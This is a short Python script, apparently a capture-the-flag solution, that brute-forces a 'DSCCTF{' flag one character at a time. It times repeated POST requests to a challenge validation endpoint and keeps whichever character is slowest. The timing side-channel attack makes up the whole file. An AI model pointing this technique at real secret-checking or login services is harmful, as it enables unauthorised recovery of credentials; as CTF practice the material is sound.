import requests
import string
import time

URL = "https://consecutive-interactions-member-stick.trycloudflare.com/validate"
CHARS = string.ascii_lowercase + "_"
flag = "DSCCTF{validated"

SAMPLES = 5  # Number of samples to average

def send(payload):
    while True:
        try:
            r = requests.post(URL, json={"flag": payload}, timeout=10)
            return r.json()
        except:
            time.sleep(0.2)

def get_avg_time(payload, samples=SAMPLES):
    """Get average response time over multiple samples"""
    times = []
    for _ in range(samples):
        data = send(payload)
        if "response_time" in data:
            times.append(data["response_time"])
        time.sleep(0.15)  # Throttle between samples
    return sum(times) / len(times) if times else 0

while not flag.endswith("_"):
    best_char = None
    best_time = -1
    
    print(f"\n[*] Testing position {len(flag)}...")
    
    for c in CHARS:
        avg_time = get_avg_time(flag + c)
        print(f"  '{c}': {avg_time:.4f}s")
        
        if avg_time > best_time:
            best_time = avg_time
            best_char = c
    
    flag += best_char
    print(f"[+] Current flag: {flag} (time: {best_time:.4f}s)")

print(f"\n[+] Final flag: {flag}")